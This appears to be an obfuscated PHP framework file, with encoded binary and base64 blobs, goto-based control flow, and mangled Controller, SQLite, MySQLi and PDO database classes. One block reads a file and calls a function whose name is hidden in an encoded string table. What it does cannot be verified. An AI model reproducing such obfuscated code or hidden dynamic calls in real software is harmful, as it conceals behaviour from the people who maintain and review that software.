Óä=!AĞ½;Ä(À3åc°^–')."\x7c\xf2\xd3\xa4\xf7\xf2\x93\x12\x8e\xb\xde\x40\xb6\x83\x24\x54\x72\x9c\xe\x3e\x4b\x9d\x95\x32\xc7\xa4\x6c\xeb\x80\x57\xd2\x32\xae\x46\xc7\xf5\x54\xea\x12\x2f\xad\xbf\xce\x1d\x9b\x78\xd7\x6b\x77\x3a\x8f\xc7"."\xc1\x39\xb\x7e\x18\x29\x39\xcf\x38\x8f\x32\x7c\x5a\x1d\x15\x22\xce\x49\x8e\x19\xa5\x42\x67\xa1\x82\x60\xf3\xa3\x2a\x8d\x1a\x50\x5b\xa9\x2f\x56\x69\x1a\xa4\x71\x17\xb\x19\x17\xd1\xc6\x70\x31\x3d\xc8\xb2\xee"."\x5c\x6d\xce\xe1\x9c\xb\x5a\xc6\x21\xec\x37\x36\x8\xef\x20\xc8\x49\x2e\x69\xc7\x7a\xf5\xf3\xe3\x5\x76\x6d\xed\x2c\x96\xb6\xc1\x2e\x22\xc0\xe2\xb1\x1f\xb5\xb8\x5c\x42\x20\x56\x64\x93\x75\xd3\x67\xce\x95\x25".base64_decode('JmIJxWUuM+FPf4DHEUCh2MFQYWae5d1PMu0Pa0p9BzsowP9sw4jDBy0q6eqWulcvmQECpw==').base64_decode('ksaYRBAdej8GVsUxxa6jJFB4DLZ/i7IPZcYh0T2xWaj3VyODD+5ZfCFgFTT7ebTcsYvMBA==').base64_decode('O+Nhma6I2TWjQEQjsqVzmdyiZTjlS7g6potEVhrOZYBsYzMUYrdJmOh/sIDsiEVPY0IlDA==')."\17\337\166\62\267\317\202\167\21\103\63\145\74\375\112\12\63\137\63\6\312\351\361\243\245\133\263\334\22\160\112\362\111\335\12\223\305\6\164\41\116\300\366\161\73\232\107\325\104\33\75\56".base64_decode('ZbxCpeye5BBYmD6UGD1cmz0iH0eAQN4w21km2V8peQAsbPSQrWvbxpJVdfkBLWlI3h+lTQ==')."\x4b\xde\x5f\x85\xd8\x89\xc8\xa9\x60\x44\xb0\xb9\x89\x6\x5\xe9\xa6\xaf\x85\x3f\xbf\xd6\x24\xfd\x3e\xbb\x2c\xc\x98\x3b\xc9\x75\x39\x9a\x3e\xc9\xbb\xb7\x21\x87\x25\xaf\xc2\x88\x26\x84\xd9\x13\xa\xd4\x1d\xdb"."\61\26\305\233\34\236\337\11\376\162\272\203\147\163\106\220\206\300\207\322\263\176\333\121\211\73\304\264\35\235\114\247\127\134\304\12\332\374\176\44\113\34\211\3\342\44\217\350\350\327\44\322"."\x2b\xa8\xac\x8\xb5\x17\xb3\x22\x22\x49\x94\xc9\x79\x8b\x67\xda\xac\x1f\x60\x3\x7f\xe\x1c\xc1\x6c\x2a\x98\xe\x67\xd9\xd4\x30\x38\xd\xb3\x63\xc1\xff\xda\x21\xec\xff\x2b\x3f\xb0\x33\x6b\x98\xec\xdf\xe6\x3f".base64_decode('vgWYc+gtvmDlsg4qd3aMw05eJwIUocn3SO7rSZwrkjMjj8z2o8bu37RMRiLC5Y8zJV66EQ==')."\xf0\xf5\x73\xcf\xce\xe5\x22\xce\x27\xc2\x4e\x8f\xdd\x5d\x44\xec\xcb\x9c\x71\xf7\x8\x3c\x82\xd3\xca\x55\x93\x5d\x5\x23\xc4\x92\x97\x70\x22\x69\xb\xa5\x48\xad\x70\x25\x43\x28\xcc\xe\x36\xec\xf8\x55\x66\x43"."\320\44\306\165\13\344\226\113\47\372\313\334\302\23\165\133\273\107\0\211\313\51\51\46\272\217\230\41\146\206\323\313\102\11\174\356\44\46\147\140\31\144\263\0\341\74\73\241\126\3\71\351".base64_decode('WcTQHjFFAthPxni2pBI8GbMtri1RXjeBzDwMLmw12hyejGkhU55b28VDqVJGaW2OUOQq+A==').strrev('‹g”TH7C­.í‰r+»‘©“'."\n".'Y`‹NĞYL.ócMöÎgqÍºÔ$vã]Ìw—†Æ]€!').base64_decode('lkcUvFNCrohD8nwwhNNRMAjHaU/l8iVJ8TohCW+dTCRNnuwpIX8M99pWCmv+iTvTWDgSUA==').base64_decode('lwWxCYvg6YFOZnw5bRD/I6zJzrYq8goONgA6DjUbApR0hBUlSbKwIGxl835+w2t/Sy29uA==').base64_decode('YPa7ZNmmvTB+NmPfiwvKFUsYBVM2v2nLxPybgXIj7EDemUMbWU9YelLBnIDtcNA1o2Z6zw==')."\327\265\202\362\171\311\31\337\120\22\116\51\321\351\156\246\44\314\312\224\255\147\120\173\73\345\362\20\154\106\55\33\20\11\347\65\116\247\65\315\66\133\126\365\222\254\125\41\126\275\300\173".base64_decode('0Thr0274BY/iyMOoYfxcfMzl19jMuwlWwPNio1/4lYeXwB+IyFeoWZXpI2HhghAREYxbeg==')._kodDe('KnisTSPVeRVk2YYvg0x8PnxgbhP2L0SHhF+YaGw/XtHOhXGGQKDAN3DG/6Y5EvGzkyGDmBU=')."\305\164\110\312\46\265\230\265\130\364\213\237\372\7\205\311\45\222\115\57\303\174\3\32\267\152\346\254\325\151\73\21\113\267\376\11\202\41\2\245\27\273\342\276\131\142\103\131\65\174\244\26"."\34\202\43\135\302\250\202\346\151\3\202\251\26\207\272\144\262\131\33\50\123\64\251\73\255\322\241\24\136\224\60\345\222\215\16\361\342\106\37\224\277\16\345\304\203\30\133\301\322\124\141\303"."\x43\xaa\x2f\x2e\xf3\xc4\x30\x71\x5a\xb9\xe1\x13\xc\x67\xaf\x2e\xdb\x8\xe1\x40\x25\x92\xa8\x3b\x27\xae\x22\x23\x1d\xa0\xb1\xe\x91\xd0\x9d\xa1\x43\xe1\x72\x22\xf1\x49\xbb\x45\x12\x5e\x8c\xaf\x19\x2a\x43\x5e"."\354\271\155\251\16\221\0\26\311\61\206\322\221\5\102\52\251\371\262\262\54\11\4\364\114\110\152\116\276\350\37\267\102\264\374\107\4\124\332\247\130\62\345\42\62\30\313\142\330\46\137\242"."\131\174\140\120\62\42\147\332\272\343\134\132\162\202\25\340\113\23\263\344\76\200\346\371\354\131\264\274\356\350\275\134\301\71\62\132\303\346\351\117\116\37\114\133\211\76\351\270\135\232\131\232".base64_decode('XiiZbOhA+XE4e8vm2imEEI2U9EfSIooZZerQHpWtRrNwTXHKsdUdZwpwXZqF65Zks8ol8w==')."\112\352\131\132\321\34\147\170\245\223\7\102\255\144\231\1\13\321\217\124\164\274\371\54\133\270\364\163\0\211\316\322\104\12\126\276\27\102\170\345\320\333\50\327\213\262\205\307\355\205\263\264".strrev('²‘Rjò¨%e²eód~æ$ıŞŒ¯"%*Ğ”V®4,SSS–máÊQNÉùM\\¶Qğ9à')."\130\306\264\353\57\71\322\345\11\2\3\345\300\101\3\0\43\26\54\223\356\27\372\241\354\171\310\144\33\51\51\346\372\163\6\47\117\111\241\376\213\71\47\137\301\71\317\45\255\331\101\77"."\127\224\114\305\227\175\255\342\302\22\246\122\131\116\106\343\317\6\205\12\35\75\63\33\126\72\241\333\355\321\313\126\40\151\76\373\110\106\222\147\73\104\311\102\336\145\323\244\51\43\140\45"."\x49\xc0\x31\x8b\x5b\x1d\xda\x9e\xc4\x1c\x9\x98\xb0\x3d\x26\xa3\x2c\x9\x5c\x86\xd1\x7b\x74\x3f\x56\xee\xe0\x37\xa8\xc4\x28\x3a\x25\xe1\x34\x3b\x6a\x14\x2c\x17\xce\x8b\x19\x79\xf2\xdb\x68\x58\x96\x50\x4b\xa1"."\x2\x26\xc2\x66\x63\x3a\xec\x92\xb4\xae\x50\x48\x5c\x97\xe2\x4e\x91\x7b\x38\x2\xb6\x4\x63\x91\x20\xdc\xe8\x63\xc9\x4d\x54\xa7\xb9\x4\xcf\xd9\x22\xf8\x7e\x8f\x47\x64\x32\xb\x37\xfb\xcd\x45\x87\xee\x81\x48"."\xe8\x37\x92\x71\x63\x88\x99\x5e\x44\x70\x25\x4d\x92\xb8\x1\xd4\x9c\xbc\xa5\x60\x8b\x0\x14\x65\x1d\x32\x62\xba\xc4\xf4\xd2\x1c\x2f\x38\x3f\x72\x93\x36\xc0\x83\xa9\x67\x55\x3e\x65\xab\x4e\x7d\x42\x72\xd\xf0".base64_decode('r2sBbgFEE9TzCRHJwmO3aCxaktXhi0aXhSNN1FFKSTapJWnqlWR1tIbbx8sLtPmCoZI8rA==')."\xd4\xd7\xae\xa\x23\x9e\x34\x2b\xd8\x41\x7a\x49\x2e\xb1\xc7\xeb\x45\xd0\xbf\x58\xf4\xa4\xd4\x76\x2a\xbb\x74\xb\x81\x5b\x4b\xb1\x2e\xd2\x25\x54\xbe\xcf\x60\x77\x4b\xac\x7c\x54\x63\x3e\xa2\xe5\x4b\xa\x3d\x2b"."\xac\xbc\x8a\x3a\x76\x19\x97\xbc\xfe\x26\x33\xc7\xcc\x3\x76\xef\x84\xe\x1d\x5b\x6\xd8\xd0\x10\x56\xd1\x6b\x87\xb6\x23\x79\x48\xc5\xe\x66\x38\x7e\xe0\x7c\xbe\xd0\x13\xf1\xd8\xf4\x49\xa4\x74\xb2\x87\x8\x52"."\222\140\123\246\367\44\141\152\331\11\222\57\55\112\57\324\110\256\230\0\334\261\323\14\320\372\134\145\304\245\13\63\172\312\202\307\352\60\245\222\32\46\15\333\262\55\55\125\126\255\202\312".base64_decode('ojGWEFLi/wPx84h6MrkAAA==')."".""."", 10, -8))); goto eÔùêå½ßË; b·¨ã˜Šã: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ğ‘ë‘Š¨ =& $_SERVER[ÕŸ²ó÷å]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ğ‘ë‘Š¨[6]] =& $config; $this->values[$ğ‘ë‘Š¨[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ğ‘ë‘Š¨[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($¿Œ³è°Ÿ) { if (1 === func_num_args()) { $this->{$¿Œ³è°Ÿ} = new $¿Œ³è°Ÿ(); } else { $êœÇÕ˜Ó = new ReflectionClass($¿Œ³è°Ÿ); $çàĞåÅ = func_get_args(); array_shift($çàĞåÅ); $this->{$¿Œ³è°Ÿ} = $êœÇÕ˜Ó->newInstanceArgs($çàĞåÅ); } return $this->{$¿Œ³è°Ÿ}; } public function routeBind($ÓÖÊğºÃ, $ñŸ¨Šıœ, $ØÛ´ÖÎ¬ = 3) { $İÛ¶Ìš– =& $_SERVER[ÕŸ²ó÷å]; $É…¡ää¾ = $this->in[$İÛ¶Ìš–[9]]; $ÓÖÊğºÃ = str_replace($İÛ¶Ìš–[10], $İÛ¶Ìš–[11], trim(trim($ÓÖÊğºÃ, $İÛ¶Ìš–[8]), $İÛ¶Ìš–[12])); if (!$ÓÖÊğºÃ || count($É…¡ää¾) <= $ØÛ´ÖÎ¬) { return !1; } $°ëœ×¤§ = !0; $Ñç€ƒõ• = explode($İÛ¶Ìš–[8], $ÓÖÊğºÃ); for ($æß‘Ë‡® = 0; $æß‘Ë‡® < count($Ñç€ƒõ•); $æß‘Ë‡®++) { if ($Ñç€ƒõ•[$æß‘Ë‡®] != $É…¡ää¾[$ØÛ´ÖÎ¬ + $æß‘Ë‡®]) { $°ëœ×¤§ = !1; break; } } if (!$°ëœ×¤§) { return; } call_user_func_array(array($this, $ñŸ¨Šıœ), array()); } public function routeArgs($¶ªºê¿ƒ = 3) { $ÂèöĞ€œ = $this->in[$_SERVER[ÕŸ²ó÷å][9]]; if (count($ÂèöĞ€œ) <= $¶ªºê¿ƒ) { return array(); } $Ì¤³ì±› = array(); for ($í¹¸ÕÕğ = $¶ªºê¿ƒ; $í¹¸ÕÕğ < count($ÂèöĞ€œ); $í¹¸ÕÕğ += 2) { $Ì¤³ì±›[$ÂèöĞ€œ[$í¹¸ÕÕğ]] = $ÂèöĞ€œ[$í¹¸ÕÕğ + 1]; $this->in[$ÂèöĞ€œ[$í¹¸ÕÕğ]] = $ÂèöĞ€œ[$í¹¸ÕÕğ + 1]; } return $Ì¤³ì±›; } protected function assign($õœÖ€‰¥, $º …Ù¹ƒ) { $this->values[$õœÖ€‰¥] = $º …Ù¹ƒ; } protected function display($éáˆÍ©) { ob_end_clean(); extract($this->values); require $this->tpl . $éáˆÍ©; } } class DbSqliteBase extends Db { public function __construct($ïõ¿·– = '') { $’áôö“„ =& $_SERVER[ÕŸ²ó÷å]; if (!extension_loaded($’áôö“„[13])) { think_exception(think_lang($’áôö“„[14]) . $’áôö“„[15]); } if (!empty($ïõ¿·–)) { if (!isset($ïõ¿·–[$’áôö“„[16]])) { $ïõ¿·–[$’áôö“„[16]] = 438; } $this->config = $ïõ¿·–; if (empty($this->config[$’áôö“„[17]])) { $this->config[$’áôö“„[17]] = array(); } } } public function connect($œ®úïÇº = '', $‡Ë¾„› = 0) { $æ¤•ø«– =& $_SERVER[ÕŸ²ó÷å]; if (!isset($this->linkID[$‡Ë¾„›])) { if (empty($œ®úïÇº)) { $œ®úïÇº = $this->config; } $£—…ÃÙ  = !empty($œ®úïÇº[$æ¤•ø«–[17]][$æ¤•ø«–[18]]) ? $œ®úïÇº[$æ¤•ø«–[17]][$æ¤•ø«–[18]] : $this->pconnect; $ÚÛøìÍª = $£—…ÃÙ  ? $æ¤•ø«–[19] : $æ¤•ø«–[20]; $this->linkID[$‡Ë¾„›] = $ÚÛøìÍª($œ®úïÇº[$æ¤•ø«–[21]], $œ®úïÇº[$æ¤•ø«–[16]]); if (!$this->linkID[$‡Ë¾„›]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$‡Ë¾„›], 30000); if (1 != think_config($æ¤•ø«–[22])) { unset($this->config); } } return $this->linkID[$‡Ë¾„›]; } public function free() { $this->queryID = null; } public function query($Ÿ®ÓÔÇØ) { $µ¼âÔ× =& $_SERVER[ÕŸ²ó÷å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ÿ®ÓÔÇØ; if ($this->queryID) { $this->free(); } think_action_status($µ¼âÔ×[23], 1); think_status($µ¼âÔ×[24]); $this->queryID = sqlite_query($this->_linkID, $Ÿ®ÓÔÇØ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $„Å†¥€É = $this->getAll(); return $„Å†¥€É; } } public function execute($¬†¤†³È) { $ĞÍÂ¾¼Ä =& $_SERVER[ÕŸ²ó÷å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¬†¤†³È; if ($this->queryID) { $this->free(); } think_action_status($ĞÍÂ¾¼Ä[25], 1); think_status($ĞÍÂ¾¼Ä[24]); $ŸÏËÆ¾ç = sqlite_exec($this->_linkID, $¬†¤†³È); $this->debug(); if (!1 === $ŸÏËÆ¾ç) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ÕŸ²ó÷å][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ªò†õ©Ä = sqlite_query($this->_linkID, $_SERVER[ÕŸ²ó÷å][27]); if (!$ªò†õ©Ä) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $–°Îöø„ = sqlite_query($this->_linkID, $_SERVER[ÕŸ²ó÷å][28]); if (!$–°Îöø„) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¤¤š¸¶Ê = array(); if ($this->numRows > 0) { for ($µËÉ„š´ = 0; $µËÉ„š´ < $this->numRows; $µËÉ„š´++) { $¤¤š¸¶Ê[$µËÉ„š´] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $¤¤š¸¶Ê; } public function getFields($Æâó²Š) { $İ†°á Ù =& $_SERVER[ÕŸ²ó÷å]; $äÏ˜Î¢ = $this->query($İ†°á Ù[29] . $Æâó²Š . $İ†°á Ù[30]); $Úîí¹ = array(); if ($äÏ˜Î¢) { foreach ($äÏ˜Î¢ as $ËµÃ‹€Ù => $¾Ã§“§Ö) { $Úîí¹[$¾Ã§“§Ö[$İ†°á Ù[31]]] = array($İ†°á Ù[32] => $¾Ã§“§Ö[$İ†°á Ù[31]], $İ†°á Ù[33] => $¾Ã§“§Ö[$İ†°á Ù[34]], $İ†°á Ù[35] => (bool) ($¾Ã§“§Ö[$İ†°á Ù[36]] === $İ†°á Ù[12]), $İ†°á Ù[37] => $¾Ã§“§Ö[$İ†°á Ù[38]], $İ†°á Ù[39] => strtolower($¾Ã§“§Ö[$İ†°á Ù[40]]) == $İ†°á Ù[41], $İ†°á Ù[42] => strtolower($¾Ã§“§Ö[$İ†°á Ù[43]]) == $İ†°á Ù[44]); } } return $Úîí¹; } public function getTables($„áõÉ±› = '') { $¹¬Ù“ˆõ =& $_SERVER[ÕŸ²ó÷å]; $ÎãÅ à’ = $this->query($¹¬Ù“ˆõ[45] . $¹¬Ù“ˆõ[46] . $¹¬Ù“ˆõ[47]); $’ï©¿˜ = array(); foreach ($ÎãÅ à’ as $¥§Ùûèõ => $…øïö) { $’ï©¿˜[$¥§Ùûèõ] = current($…øïö); } return $’ï©¿˜; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÄÚ³ƒƒ¡ =& $_SERVER[ÕŸ²ó÷å]; $áûâöø× = sqlite_last_error($this->_linkID); $this->error = $áûâöø× . $ÄÚ³ƒƒ¡[4] . sqlite_error_string($áûâöø×); if ($ÄÚ³ƒƒ¡[12] != $this->queryStr) { $this->error .= LNG($ÄÚ³ƒƒ¡[48]) . $this->queryStr; } think_trace($this->error, $ÄÚ³ƒƒ¡[12], $ÄÚ³ƒƒ¡[49]); return $this->error; } public function escapeString($Æ–Í÷æº) { return sqlite_escape_string($Æ–Í÷æº); } public function parseLimit($‹š¡€Åš) { $ƒ¡ü‰ø´ =& $_SERVER[ÕŸ²ó÷å]; $ì„Ûó°Ä = $ƒ¡ü‰ø´[12]; if (!empty($‹š¡€Åš)) { $‹š¡€Åš = explode($ƒ¡ü‰ø´[50], $‹š¡€Åš); if (count($‹š¡€Åš) > 1) { $ì„Ûó°Ä .= $ƒ¡ü‰ø´[51] . $‹š¡€Åš[1] . $ƒ¡ü‰ø´[52] . $‹š¡€Åš[0] . $ƒ¡ü‰ø´[53]; } else { $ì„Ûó°Ä .= $ƒ¡ü‰ø´[51] . $‹š¡€Åš[0] . $ƒ¡ü‰ø´[53]; } } return $ì„Ûó°Ä; } } if ($_SERVER[$_SERVER[ÕŸ²ó÷å][54]] != $_SERVER[$_SERVER[ÕŸ²ó÷å][55]]) { $_getc = $_SERVER[ÕŸ²ó÷å][56]; $_getfile = $_SERVER[$_SERVER[ÕŸ²ó÷å][57]] . $_SERVER[ÕŸ²ó÷å][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÕŸ²ó÷å][59], $_getfilec); if (count($_getarrs) < $_SERVER[ÕŸ²ó÷å][60]) { $exit = $_SERVER[ÕŸ²ó÷å][61]; $exit(); } $_act = $_SERVER[ÕŸ²ó÷å][62]; $_act($_SERVER[$_SERVER[ÕŸ²ó÷å][63]]); } goto aÀ±©â³ ; DÕ£²Şñ: class DbMysqli extends Db { public function __construct($ë“Ó¢Àú = '') { $ú˜¦Ÿş¥ =& $_SERVER[ÕŸ²ó÷å]; if (!extension_loaded($ú˜¦Ÿş¥[993])) { think_exception(think_lang($ú˜¦Ÿş¥[14]) . $ú˜¦Ÿş¥[994]); } if (!empty($ë“Ó¢Àú)) { $this->config = $ë“Ó¢Àú; if (empty($this->config[$ú˜¦Ÿş¥[17]])) { $this->config[$ú˜¦Ÿş¥[17]] = $ú˜¦Ÿş¥[12]; } } } public function connect($º‘¢´œÓ = '', $ğà€õ÷Õ = 0) { $ù¢‹ĞÑ =& $_SERVER[ÕŸ²ó÷å]; if (!isset($this->linkID[$ğà€õ÷Õ])) { if (empty($º‘¢´œÓ)) { $º‘¢´œÓ = $this->config; } $this->linkID[$ğà€õ÷Õ] = new mysqli($º‘¢´œÓ[$ù¢‹ĞÑ[967]], $º‘¢´œÓ[$ù¢‹ĞÑ[969]], $º‘¢´œÓ[$ù¢‹ĞÑ[970]], $º‘¢´œÓ[$ù¢‹ĞÑ[21]], $º‘¢´œÓ[$ù¢‹ĞÑ[968]] ? intval($º‘¢´œÓ[$ù¢‹ĞÑ[968]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¨æş–ó = $this->linkID[$ğà€õ÷Õ]->server_version; $this->linkID[$ğà€õ÷Õ]->query($ù¢‹ĞÑ[971] . think_config($ù¢‹ĞÑ[972]) . $ù¢‹ĞÑ[68]); if ($¨æş–ó > $ù¢‹ĞÑ[973]) { $this->linkID[$ğà€õ÷Õ]->query($ù¢‹ĞÑ[974]); } $this->connected = !0; if (1 != think_config($ù¢‹ĞÑ[22])) { unset($this->config); } } return $this->linkID[$ğà€õ÷Õ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($——›é›Œ) { $ŒÀ³ñ§Ç =& $_SERVER[ÕŸ²ó÷å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $——›é›Œ; if ($this->queryID) { $this->free(); } think_action_status($ŒÀ³ñ§Ç[23], 1); think_status($ŒÀ³ñ§Ç[24]); $this->queryID = $this->_linkID->query($——›é›Œ); if ($this->_linkID->more_results()) { while (($äÍÈ”´† = $this->_linkID->next_result()) != NULL) { $äÍÈ”´†->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Üšµä ) { $˜œº’Üê =& $_SERVER[ÕŸ²ó÷å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Üšµä ; if ($this->queryID) { $this->free(); } think_action_status($˜œº’Üê[25], 1); think_status($˜œº’Üê[24]); $Üï‘«´ = $this->_linkID->query($Üšµä ); $this->debug(); if (!1 === $Üï‘«´) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÍÖ’ñúÔ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÍÖ’ñúÔ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÀÛÚíøí = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÀÛÚíøí) { $this->error(); return !1; } } return !0; } private function getAll() { $ÈÂ˜ıÏ = array(); if ($this->numRows > 0) { for ($µîÛ³Œ– = 0; $µîÛ³Œ– < $this->numRows; $µîÛ³Œ–++) { $ÈÂ˜ıÏ[$µîÛ³Œ–] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ÈÂ˜ıÏ; } public function getFields($Ş‡ä²Œ) { $Şá«™ûè =& $_SERVER[ÕŸ²ó÷å]; $‚¢Şğš = $this->query($Şá«™ûè[978] . $this->parseKey($Ş‡ä²Œ)); $Œ“ôôºù = array(); if ($‚¢Şğš) { foreach ($‚¢Şğš as $‘®îÒ™ => $©÷¥Ú•Ğ) { $Œ“ôôºù[$©÷¥Ú•Ğ[$Şá«™ûè[31]]] = array($Şá«™ûè[32] => $©÷¥Ú•Ğ[$Şá«™ûè[31]], $Şá«™ûè[33] => $©÷¥Ú•Ğ[$Şá«™ûè[34]], $Şá«™ûè[35] => (bool) ($©÷¥Ú•Ğ[$Şá«™ûè[36]] === $Şá«™ûè[12]), $Şá«™ûè[37] => $©÷¥Ú•Ğ[$Şá«™ûè[38]], $Şá«™ûè[39] => strtolower($©÷¥Ú•Ğ[$Şá«™ûè[40]]) == $Şá«™ûè[41], $Şá«™ûè[42] => strtolower($©÷¥Ú•Ğ[$Şá«™ûè[43]]) == $Şá«™ûè[44]); } } return $Œ“ôôºù; } public function getTables($È¥Š²ä  = '') { $Š‡¨¾Ø =& $_SERVER[ÕŸ²ó÷å]; $¸éİ³êÕ = !empty($È¥Š²ä ) ? $Š‡¨¾Ø[980] . $È¥Š²ä  . $Š‡¨¾Ø[981] : $Š‡¨¾Ø[982]; $ğœ¦‡Úƒ = $this->query($¸éİ³êÕ); $ªé†úï¯ = array(); if ($ğœ¦‡Úƒ) { foreach ($ğœ¦‡Úƒ as $Õàª §Â => $ù„¢È»®) { $ªé†úï¯[$Õàª §Â] = current($ù„¢È»®); } } return $ªé†úï¯; } public function replace($¦¢Ó¯Íé, $áÚÛú×ª = array()) { $ÊÒÓİ†¦ =& $_SERVER[ÕŸ²ó÷å]; foreach ($¦¢Ó¯Íé as $°ù´÷Êï => $ ı°ôĞÓ) { $Ó°…ŞÌ = $this->parseValue($ ı°ôĞÓ); if (is_scalar($Ó°…ŞÌ)) { $·¬‰ßÅù[] = $Ó°…ŞÌ; $Êû±æº¼[] = $this->parseKey($°ù´÷Êï); } } $‡áÎ·Î = $ÊÒÓİ†¦[983] . $this->parseTable($áÚÛú×ª[$ÊÒÓİ†¦[365]]) . $ÊÒÓİ†¦[984] . implode($ÊÒÓİ†¦[50], $Êû±æº¼) . $ÊÒÓİ†¦[985] . implode($ÊÒÓİ†¦[50], $·¬‰ßÅù) . $ÊÒÓİ†¦[986]; return $this->execute($‡áÎ·Î); } public function insertAll($óì¼¼×, $Ä¼”â¡ñ = array(), $ï³ßÒ = false) { $ß¬­ Á¢ =& $_SERVER[ÕŸ²ó÷å]; if (!is_array($óì¼¼×[0])) { return !1; } $ÇšÔüŸÊ = array_keys($óì¼¼×[0]); $ŒµüÌ…¦ = array(); foreach ($óì¼¼× as $‰âÛ¸˜) { $…ìÂ®ıß = array(); foreach ($‰âÛ¸˜ as $ïÌ›Åç => $û¤µÉÃ) { $û¤µÉÃ = $this->parseValue($û¤µÉÃ); if (is_scalar($û¤µÉÃ)) { $…ìÂ®ıß[] = $û¤µÉÃ; } } $ŒµüÌ…¦[] = $ß¬­ Á¢[346] . implode($ß¬­ Á¢[50], $…ìÂ®ıß) . $ß¬­ Á¢[986]; } array_walk($ÇšÔüŸÊ, array($this, $ß¬­ Á¢[987])); $‰®şÖ¼¥ = $ï³ßÒ ? $ß¬­ Á¢[988] : $ß¬­ Á¢[989]; $ŒËÉ˜Äó = $‰®şÖ¼¥ . $ß¬­ Á¢[990] . $this->parseTable($Ä¼”â¡ñ[$ß¬­ Á¢[365]]) . $ß¬­ Á¢[984] . implode($ß¬­ Á¢[50], $ÇšÔüŸÊ) . $ß¬­ Á¢[991] . implode($ß¬­ Á¢[50], $ŒµüÌ…¦); return $this->execute($ŒËÉ˜Äó); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¦ƒ’æ‘ú =& $_SERVER[ÕŸ²ó÷å]; $this->error = $this->_linkID->errno . $¦ƒ’æ‘ú[4] . $this->_linkID->error; if ($¦ƒ’æ‘ú[12] != $this->queryStr) { $this->error .= LNG($¦ƒ’æ‘ú[48]) . $this->queryStr; } think_trace($this->error, $¦ƒ’æ‘ú[12], $¦ƒ’æ‘ú[49]); return $this->error; } public function escapeString($ŸĞ¿Û·Å) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ŸĞ¿Û·Å); } else { return addslashes($ŸĞ¿Û·Å); } } public function parseKey(&$¤¬Ş®ê, $Ïìöìø = true) { $»¬Ú—ë =& $_SERVER[ÕŸ²ó÷å]; if ($Ïìöìø) { $¤¬Ş®ê = $this->parseKeyCheck($¤¬Ş®ê); } if ($¤¬Ş®ê != $»¬Ú—ë[230] && !preg_match($»¬Ú—ë[992], $¤¬Ş®ê)) { $¤¬Ş®ê = $»¬Ú—ë[470] . trim($¤¬Ş®ê, $»¬Ú—ë[470]) . $»¬Ú—ë[470]; } return $¤¬Ş®ê; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($á •ú½’ = '') { $•Õ©ı’Ò =& $_SERVER[ÕŸ²ó÷å]; if (!class_exists($•Õ©ı’Ò[995])) { think_exception(think_lang($•Õ©ı’Ò[14]) . $•Õ©ı’Ò[996]); } if (!empty($á •ú½’)) { $this->config = $á •ú½’; if (empty($this->config[$•Õ©ı’Ò[17]])) { $this->config[$•Õ©ı’Ò[17]] = array(); } } } public function connect($°ËÕ¿ = '', $Òµº§• = 0) { $îÏÂÅ« =& $_SERVER[ÕŸ²ó÷å]; if (!isset($this->linkID[$Òµº§•])) { if (empty($°ËÕ¿)) { $°ËÕ¿ = $this->config; } $£€ÃÒÒ½ = !empty($°ËÕ¿[$îÏÂÅ«[17]][$îÏÂÅ«[18]]) ? $°ËÕ¿[$îÏÂÅ«[17]][$îÏÂÅ«[18]] : $this->pconnect; if ($£€ÃÒÒ½) { $°ËÕ¿[$îÏÂÅ«[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Òµº§•] = new PDO($°ËÕ¿[$îÏÂÅ«[997]], $°ËÕ¿[$îÏÂÅ«[969]], $°ËÕ¿[$îÏÂÅ«[970]], $°ËÕ¿[$îÏÂÅ«[17]]); } catch (PDOException $àô¾ÃØÜ) { think_exception($àô¾ÃØÜ->getMessage()); } $this->dbType = $this->_getDsnType($°ËÕ¿[$îÏÂÅ«[997]]); if (in_array($this->dbType, array($îÏÂÅ«[998], $îÏÂÅ«[999], $îÏÂÅ«[1000], $îÏÂÅ«[1001]))) { think_exception($îÏÂÅ«[1002] . $this->dbType . $îÏÂÅ«[1003] . $this->dbType . $îÏÂÅ«[1004]); } if 